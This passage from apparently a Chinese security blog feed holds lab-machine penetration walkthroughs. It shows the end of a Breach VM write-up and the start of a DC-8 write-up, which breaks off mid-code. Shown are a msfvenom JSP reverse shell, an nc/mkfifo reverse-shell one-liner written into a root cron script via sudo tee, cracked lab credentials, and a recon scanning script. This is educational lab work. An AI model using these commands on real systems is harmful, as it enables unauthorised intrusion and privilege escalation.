rel="noopener">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap的秘钥证书</a></p></li><li><p>找打了密码那就解开来看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore keystore</span><br><span class="line"><span class="meta">#</span><span class="bash">结果:</span></span><br><span class="line">密钥库类型: JKS</span><br><span class="line">密钥库提供方: SUN</span><br><span class="line"></span><br><span class="line">您的密钥库包含 1 个条目</span><br><span class="line"></span><br><span class="line">别名: tomcat</span><br><span class="line">创建日期: 2016-5-21</span><br><span class="line">条目类型: PrivateKeyEntry</span><br><span class="line">证书链长度: 1</span><br><span class="line">证书[1]:</span><br><span class="line">所有者: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">发布者: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">序列号: 60856e88</span><br><span class="line">有效期开始日期: Sat May 21 01:51:07 CST 2016, 截止日期: Fri Aug 19 01:51:07 CST 2016</span><br><span class="line">证书指纹:</span><br><span class="line">         MD5: C4:72:E6:B0:5F:58:CE:8B:B4:7E:2D:67:86:A9:52:A0</span><br><span class="line">         SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53</span><br><span class="line">         SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31</span><br><span class="line">         签名算法名称: SHA256withRSA</span><br><span class="line">         版本: 3</span><br><span class="line"></span><br><span class="line">扩展:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">1: ObjectId: 2.5.29.14 Criticality=<span class="literal">false</span></span></span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 47 6B A3 37 ED A5 1F 0A   0D 61 CA AA 17 9C F4 8C  Gk.7.....a......</span><br><span class="line">0010: 10 64 87 DF                                        .d..</span><br><span class="line">]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>用Wireshark打开SSL_test_phase1.pcap看了一下，发现都是加密的</p></li><li><p>那我们要导出证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#命令:</span></span><br><span class="line">keytool -importkeystore -srckeystore &lt;keystore路径&gt; -destkeystore &lt;证书保存的位置\.p12&gt; -deststoretype PKCS12 -srcalias tomcat</span><br></pre></td></tr></table></figure></li><li><p>导出之后再将导出的证书导入Wireshark</p></li><li><p>开始分析他们的攻击流量</p></li><li><p>找到路径:<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p></li><li><p>进不去？？咋办？？？</p></li><li><p>ie低版本才能进去啊。。。</p></li><li><p>未完待续。。。</p></li><li><p>今天搞了个xp发现可一进去，但是需要密码啊！！</p></li><li><p>接着去分析流量去</p></li><li><p>找到这样的一行<code>username=&quot;tomcat&quot; password=&quot;s3cret&quot;</code></p></li><li><p>去试试。。。</p></li><li><p>密码不对进不去</p></li><li><p>然后又在找</p></li><li><p>最后在一个请求头里面找到<code>Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code></p></li><li><p>base64编码，去解开<code>tomcat:Tt\5D8F(#!*u=G)4m7zB</code>这个好像是密码</p></li><li><p>进去之后找到一个上传war包的地方</p></li><li><p>使用kali生成一个shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.110.120 -o /tmp/s.jsp</span><br></pre></td></tr></table></figure></li><li><p>得到一个tomcat的shell</p></li><li><p>想办法提权</p></li><li><p>到网站目录下找到两个MD5命名的php文件</p></li><li><p>查看到两个都是数据库连接文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Database Username</span><br><span class="line">// Your database user account on the host</span><br><span class="line">define( 'SDATA_DB_USER', 'root' );</span><br><span class="line"></span><br><span class="line">// Database Password</span><br><span class="line">// Password for your database user account</span><br><span class="line">define( 'SDATA_DB_PASS', '' );</span><br></pre></td></tr></table></figure></li><li><p>查看数据库的账号密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select user,password from user;</span><br><span class="line">+------------------+-------------------------------------------+</span><br><span class="line">| user             | password                                  |</span><br><span class="line">+------------------+-------------------------------------------+</span><br><span class="line">| root             |                                           |</span><br><span class="line">| milton           | 6450d89bd3aff1d893b85d3ad65d2ec2          |</span><br><span class="line">| root             |                                           |</span><br><span class="line">| root             |                                           |</span><br><span class="line">| debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 |</span><br><span class="line">+------------------+-------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p>发现一个账户 <code>milton  ： 6450d89bd3aff1d893b85d3ad65d2ec2</code></p></li><li><p>mysql都是MD5加密的碰撞之后得到：<code>thelaststraw</code></p></li><li><p>再看看怎么提权</p></li><li><p><code>cat /etc/passwd</code>看看用户信息</p></li><li><p>找到两个用户创建的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash</span><br><span class="line">2. blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash</span><br></pre></td></tr></table></figure></li><li><p><code>milton</code>这个用户和mysql的用户名一致那密码会不会也一样？</p></li><li><p>试试…</p></li><li><p>发现进去了提权到了milton普通用户</p></li><li><p>回到home目录下发现只有两个文件</p></li><li><p>一张图片，一个sh，sh里面写的是：<code>There&#39;s nothing here</code> (这里什么都没有)</p></li><li><p>这时候想想看图片隐写</p></li><li><p>用scp拿下来：<code>scp [-r &lt;dir&gt;] my_badge.jpg root@192.168.110.120:/tmp</code> </p></li><li><p>读取一下并没有什么东西，然后到网站目录下去看看，发现一个images文件夹</p></li><li><p>里面的图片都是以人名命名的，都是照片？下下来读取一下数据</p></li><li><p>最后在bill.png中找到一个键值对：<code>Comment：coffeestains</code>  Comment（解释）coffeestains（咖啡渍）</p></li><li><p>对图片的解释？可能是blumbergh的密码，都试试看</p></li><li><p>发现coffeestains就是blumbergh的密码，然后我们进blumbergh的账户</p></li><li><p>然后三部曲：<code>cd  history  crontab -l</code></p></li><li><p>查看home目录的内容：发现是空的</p></li><li><p>查看计划任务：发现啥也没有</p></li><li><p>查看history发现有两行特殊的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/cleanup</span><br><span class="line">cat tidyup.sh</span><br></pre></td></tr></table></figure></li><li><p>顺藤摸瓜&gt; 我们看到tidyup.sh的内容是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Hacker Evasion Script </span></span><br><span class="line"><span class="comment">#Initech Cyber Consulting, LLC</span></span><br><span class="line"><span class="comment">#彼得·吉本斯和迈克尔·博尔顿-2016</span></span><br><span class="line"><span class="comment">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span></span><br><span class="line"><span class="comment">#黑客规避脚本</span></span><br><span class="line"><span class="comment">#Initech网络咨询有限责任公司</span></span><br><span class="line"><span class="comment">#此脚本设置为每3分钟运行一次，作为对黑客的额外防御措施。</span></span><br><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br></pre></td></tr></table></figure></li><li><p>竟然是一个黑客防御的脚本</p></li><li><p>然后发现是root用户的脚本而且还是3分钟执行一次</p></li><li><p>我们想办法把里面的语句变成shellcode</p></li><li><p>查看该用户可以执行root的什么命令 <code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#User blumbergh may run the following commands on Breach:</span></span><br><span class="line">    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure></li><li><p>发现可以使用一个tee的文件百度一看，这是一个获得标准输入的命令</p></li><li><p>我们通过tee将shellcode写到tidyup.sh</p></li><li><p>先写一个shellcode</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"mkfifo /tmp/lcawx; nc 192.168.110.120 20096 0&lt;/tmp/lcawx | /bin/sh &gt;/tmp/lcawx 2&gt;&amp;1; rm /tmp/lcawx"</span> &gt; /tmp/s</span><br><span class="line"><span class="comment">#再执行</span></span><br><span class="line">cat /tmp/s | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure><ul><li><p>kalii监听一个20096端口：<code>nc -lvp 20096</code></p></li><li><p>静静的等带3分钟的到来</p></li><li><p>然后就反弹了一个shell</p></li><li><p>我们再用python将提升到标准shell</p></li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure><ul><li>就拿到了rootshell！！</li><li><strong>THEEND</strong></li></ul><h2><span id="2-重要信息">2. 重要信息</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 网站账号密码：pgibbons : damnitfeel<span class="variable">$goodtobeagang</span><span class="variable">$ta</span></span><br><span class="line">2. 红客攻击流量包地址：http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</span><br><span class="line">3. keystore密钥地址：http://192.168.110.140/.keystore</span><br><span class="line">4. tomcat后台地址：https://192.168.110.140:8443/_M@nag3Me/html</span><br><span class="line">5. tomcat后台账号密码：tomcat : Tt\5D8F(<span class="comment">#!*u=G)4m7zB</span></span><br><span class="line">6. mysql账号密码： root : &lt;null&gt;</span><br><span class="line">7. mysql另一个账号密码 ： milton : thelaststraw（也是服务器milton用户的密码）</span><br><span class="line">8. 服务器用户密码：blumbergh : coffeestains</span><br><span class="line">9. 最后拿到了rootshell 把密码改成了 flair</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#fbi靶机渗透&quot;&gt;fbi靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-渗透过程&quot;&gt;1. 渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-重要信息&quot;&gt;2. 重要信息&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DC-8 靶机渗透</title>
    <link href="https://atc96.top/DC-8/"/>
    <id>https://atc96.top/DC-8/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T10:26:17.023Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#dc-8-靶机渗透">DC-8 靶机渗透</a><ul><li><a href="#1-渗透过程">1. 渗透过程</a></li><li><a href="#__the_end__"><strong>THE_END!</strong></a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="dc-8-靶机渗透">DC-8 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul><li>今天我们用一个脚本来做前期的扫描</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> commands <span class="keyword">as</span> cmd</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">color = &#123;</span><br><span class="line">    <span class="string">'black'</span> :   <span class="string">'\033[30m'</span>,</span><br><span class="line">    <span class="string">'red'</span>   :   <span class="string">'\033[31m'</span>,</span><br><span class="line">    <span class="string">'green'</span> :   <span class="string">'\033[32m'</span>,</span><br><span class="line">    <span class="string">'yellow'</span>:   <span class="string">'\033[33m'</span>,</span><br><span class="line">    <span class="string">'blue'</span>  :   <span class="string">'\033[34m'</span>,</span><br><span class="line">    <span class="string">'purple'</span>:   <span class="string">'\033[35m'</span>,</span><br><span class="line">    <span class="string">'suffix'</span>:   <span class="string">'\033[0m'</span></span><br><span class="line">&#125;</span><br><span class="line">result = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_color</span><span class="params">(s, c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> color.keys():</span><br><span class="line">        <span class="keyword">return</span> color[c] + s + color[<span class="string">'suffix'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_adder</span><span class="params">(addr)</span>:</span></span><br><span class="line">    compile_ip = re.compile(</span><br><span class="line">        <span class="string">r'^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> compile_ip.match(addr):</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_addr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cmd.getoutput(<span class="string">"arp-scan --interface eth0 192.168.0.0/24 | grep VMware | awk '&#123;print $1&#125;'"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_adders</span><span class="params">()</span>:</span></span><br><span class="line">    adders = scan_addr().split(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(adders) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> adders: print(add_color(<span class="string">'[*] IP address found:&#123;&#125;'</span>.format(addr), <span class="string">'blue'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(add_color(<span class="string">'[!] No IP address found!'</span>, <span class="string">'yellow'</span>))</span><br><span class="line">        input_addr = input(<span class="string">'Please enter the IP address manually. Multiple IP addresses are separated by ","'</span>)</span><br><span class="line">        adders = [check_adder(addr) <span class="keyword">for</span> addr <span class="keyword">in</span> input_addr.split(<span class="string">','</span>)]</span><br><span class="line">    <span class="keyword">return</span> adders</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> check_adder(addr):</span><br><span class="line">        print(add_color(<span class="string">'[*] Start scanning port of &#123;&#125; ...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">        result[<span class="string">'nmap'</span>] = cmd.getoutput(<span class="string">"nmap -sS -A -p- &#123;&#125;"</span>.format(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nikto_scan</span><span class="params">(addr)</span>:</span></span><br><span class="line">    print(add_color(<span class="string">'[*] Start scanning Web Services of &#123;&#125;...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">    res = cmd.getoutput(<span class="string">"nikto -host &#123;&#125;"</span>.format(addr))</span><br><span class="line">    errors = re.findall(<span class="string">r'No web server found'</span>, res)</span><br><span class="line">    <span class="keyword">if</span> len(errors) &gt; <span class="number">0</span>:</span><br><span class="line">        print(add_color(<span class="string">'[!] An error was encountered while scanning the Host:&#123;&#125;:80.'</span>.format(addr), <span class="string">'red'</span>))</span><br><span class="line">        host = input(<span class="string">'Please enter the correct URL:\n'</span>)</span><br><span class="line">        res = cmd.getoutput(<span class="string">"nikto -host &#123;&#125;"</span>.format(host))</span><br><span class="line">    result[<span class="string">'nikto'</span>] = res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whatweb_scan</span><span class="params">(addr)</span>:</span></span><br><span class="line">    print(add_color(<span class="string">'[*] Start scanning Web information of &#123;&#125;...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">    cs = cmd.getoutput(<span class="string">"whatweb &#123;&#125;"</span>.format(addr))</span><br><span class="line">    _r = re.sub(<span class="string">r'\033\[\d&#123;1,2&#125;m'</span>, <span class="string">''</span>, cs)</span><br><span class="line">    res = _r.split(<span class="string">','</span>)</span><br><span class="line">    ls = [res[<span class="number">-4</span>], res[<span class="number">-3</span>], res[<span class="number">-2</span>]]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    res.append(<span class="string">','</span>.join(ls))</span><br><span class="line">    result[<span class="string">'whatweb'</span>] = res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入输出结果</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_result</span><span class="params">(addr)</span>:</span></span><br><span class="line">    ld = [<span class="string">'&gt;&gt;&gt;'</span>, <span class="string">'Language'</span>, <span class="string">'Country'</span>, <span class="string">'Framework'</span>, <span class="string">'Server'</span>, <span class="string">'IP'</span>, <span class="string">'JsFWK'</span>, <span class="string">'MetaGenerator'</span>, <span class="string">'ScriptType'</span>, <span class="string">'Title'</span>,</span><br><span class="line">          <span class="string">'XFO'</span>, <span class="string">'UH'</span>]</span><br><span class="line">    threads = list()</span><br><span class="line">    threads.append(threading.Thread(target=scan_port, args=(addr,)))</span><br><span class="line">    threads.append(threading.Thread(target=nikto_scan, args=(addr,)))</span><br><span class="line">    threads.append(threading.Thread(target=whatweb_scan, args=(addr,)))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads: t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads: t.join()</span><br><span class="line"></span><br><span class="line">    style = <span class="string">'style="background-color:#000;color:#0F0;width:96%;padding:2%;border:2px double #2F2;"'</span></span><br><span class="line">    html = <span class="string">r"""&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html style="background-color:#000; color:#FFF;"&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;Auto-Scan&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset="utf-8"/&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body style="font-size:120%;"&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt; &lt;h1&gt;Auto-Scan Report - [&#123;ip&#125;]&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-Port&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&#123;sp&#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-WebServer&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&#123;sw&#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-WebServer&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&lt;table&gt;</span></span><br><span class="line"><span class="string">    &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &#123;sww&#125;</span></span><br><span class="line"><span class="string">    &lt;/tbody&gt;</span></span><br><span class="line"><span class="string"> &lt;/table&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt; All Rights Reserved &amp;copy; &lt;strong&gt;Auto-Scan&lt;/strong&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;"""</span>.format(ip=addr,</span><br><span class="line">                  sy=style,</span><br><span class="line">                  sp=result[<span class="string">'nmap'</span>],</span><br><span class="line">                  sw=result[<span class="string">'nikto'</span>],</span><br><span class="line">                  sww=<span class="string">''</span>.join([<span class="string">'&lt;tr&gt;&lt;td&gt;&#123;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#125;&lt;/td&gt;&lt;/tr&gt;'</span>.</span><br><span class="line">                              format(ld[i], result[<span class="string">'whatweb'</span>][i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(result[<span class="string">'whatweb'</span>]))]))</span><br><span class="line">    _dir = <span class="string">'Auto-Scan'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(_dir):</span><br><span class="line">        os.mkdir(_dir, <span class="number">0o755</span>)</span><br><span class="line">    fd = open(<span class="string">'&#123;dir&#125;/&#123;ip&#125;.html'</span>.format(dir=_dir, ip=addr), <span class="string">'w'</span>)</span><br><span class="line">    fd.write(html)</span><br><span class="line">    fd.flush()</span><br><span class="line">    fd.close()</span><br><span class="line">    print(add_color(<span class="string">'[+] IP address:&#123;ip&#125; scan completed, the results are saved in: &#123;dir&#125;/&#123;ip&#125;.html'</span>.format(dir=_dir, ip=addr), <span class="string">'green'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">'win'</span>):</span><br><span class="line">        print(add_color(<span class="string">'[-] This script can only be executed under Linux!'</span>, <span class="string">'red'</span>))</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    banner = <span class="string">r"""</span></span><br><span class="line"><span class="string">                 _                 _____</span></span><br><span class="line"><span class="string">    /\          | |               / ____|</span></span><br><span class="line"><span class="string">   /  \   _   _ | |_  ___  ______| (___    ___  __ _  _ __   _ __    ___  _ __</span></span><br><span class="line"><span class="string">  / /\ \ | | | || __|/ _ \|______|\___ \  / __|/ _` || '_ \ | '_ \  / _ \| '__|</span></span><br><span class="line"><span class="string"> / ____ \| |_| || |_| (_) |       ____) || (__| (_| || | | || | | ||  __/| |</span></span><br><span class="line"><span class="string">/_/    \_\\__,_| \__|\___/       |_____/  \___|\__,_||_| |_||_| |_| \___||_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#123;&#125;: &#123;&#125;</span></span><br><span class="line"><span class="string">    """</span>.format(add_color(<span class="string">'Author'</span>, <span class="string">'yellow'</span>), add_color(<span class="string">'@Rex_Surprise'</span>, <span class="string">'blue'</span>))</span><br><span class="line">    print(add_color(banner, <span class="string">'purple'</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> get_adders():threading.Thread(target=write_result, args=(addr,)).start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(add_color(e, <span class="string">'red'</span>))</span><br></pre></td></tr></table></figure><ul><li><p>直接执行脚本就完成了<code>ip发现</code>、<code>端口扫描</code>和<code>nikto扫描</code></p></li><li><p>扫描结果：</p></li><li><p><img data-src="../images/mdImages/image-20200503173049526.png" alt="image-20200504221620693"></p></li><li><p>从扫描结果可以看到，IP地址为：<code>192.168.0.29</code> 开放的端口只有 22 和 80</p></li><li><p>然后扫描了Web服务，发现是一个Drupal框架版本是Drupal 7</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 